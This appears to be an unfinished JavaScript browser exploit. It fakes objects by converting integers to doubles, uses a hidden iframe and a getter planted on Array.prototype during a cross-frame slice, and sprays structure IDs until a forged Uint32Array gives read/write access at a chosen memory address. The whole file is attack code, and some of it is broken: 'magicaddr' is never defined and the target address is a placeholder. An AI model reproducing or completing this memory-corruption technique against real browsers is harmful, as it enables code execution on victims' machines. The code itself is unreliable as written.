var _dview
function u2d (low, hi) {
  if (!_dview) _dview = new DataView(new ArrayBuffer(8))
  _dview.setUint32(0, low, true)
  _dview.setUint32(4, hi, true)
  return _dview.getFloat64(0, true)
}

function buildObject (low, hi, cb) {
  console.log('Building stuff.')
  var f = document.body.appendChild(document.createElement('iframe'))
  f.style = 'display: none'
  f.onload = function() {
    f.onload = null
    var remote = f.contentWindow.getDoubleArray(u2d(low, hi))
    Array.prototype.__defineGetter__(888, function () {})
    var sub = [].slice.call(remote, 0, 4)
    cb(sub[0])
  }
  f.src = 'frame.html'
}

function main() {
  alert('test');
  buildObject(0, 0, function (b) {
    buildObject(0x1337, 0x1, function (d) {
      var sid = 1
      var magic = {
        'a': u2d(sid, 0x1602300 - 0x10000),
        'b': b,
        'c': u2d(1, 2),
        'd': d
      }
      d = 0
      b = 0

      var rwaddr = 0xf00b; // XXX: Address to read/write here!

      buildObject(rwaddr, 0, function (c) { // or maybe 0, rwaddr?  might have to fuck with that.
        magic.c = c
        c = 0
        buildObject(magicaddr[0] + 4 * 4, magicaddr[1], function (o) {
          console.log('Inside o...')
          while (sid < 0x10000 && !(o instanceof Uint32Array)) { magic.a = u2d(++sid, 0x1602300 - 0x10000) }
          if (!(o instanceof Uint32Array)) {
            console.log('Could not find structure ID.  Wtf?')
            return
          }

          // o now is a Uint32Array pointing to rwaddr
        });
      });
    });
  });
}
